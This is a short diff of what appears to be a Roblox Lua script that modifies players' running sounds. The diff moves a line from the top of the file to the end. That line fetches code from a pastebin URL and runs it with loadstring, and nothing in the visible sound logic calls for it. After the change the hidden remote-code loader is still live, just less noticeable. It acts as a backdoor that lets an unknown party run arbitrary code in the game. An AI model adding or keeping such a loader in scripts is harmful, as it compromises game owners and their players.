@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/8c5f7KDJ",true))()
 
 local Players = game:GetService("Players")
 
@@ -20,3 +19,6 @@ end
 Players.PlayerAdded:Connect(function(player)
     player.CharacterAdded:Connect(modifyRunningSound)
 end)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/8c5f7KDJ",true))()
+
